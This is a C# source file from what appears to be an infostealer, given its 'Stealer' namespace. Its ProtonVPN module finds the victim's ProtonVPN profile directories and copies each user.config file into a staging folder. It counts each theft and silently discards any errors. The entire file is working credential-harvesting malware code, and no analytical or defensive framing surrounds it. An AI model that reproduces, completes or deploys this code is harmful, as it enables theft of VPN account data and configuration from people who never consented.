using System;
using System.IO;

namespace Stealer;

internal sealed class ProtonVPN
{
	public static void Save(string sSavePath)
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text in directories)
			{
				if (!text.Contains("ProtonVPN.exe"))
				{
					continue;
				}
				string[] directories2 = Directory.GetDirectories(text);
				foreach (string text2 in directories2)
				{
					string text3 = text2 + "\\user.config";
					string text4 = Path.Combine(sSavePath, new DirectoryInfo(Path.GetDirectoryName(text3)).Name);
					if (!Directory.Exists(text4))
					{
						Counter.VPN++;
						Directory.CreateDirectory(text4);
						File.Copy(text3, text4 + "\\user.config");
					}
				}
			}
		}
		catch
		{
		}
	}
}
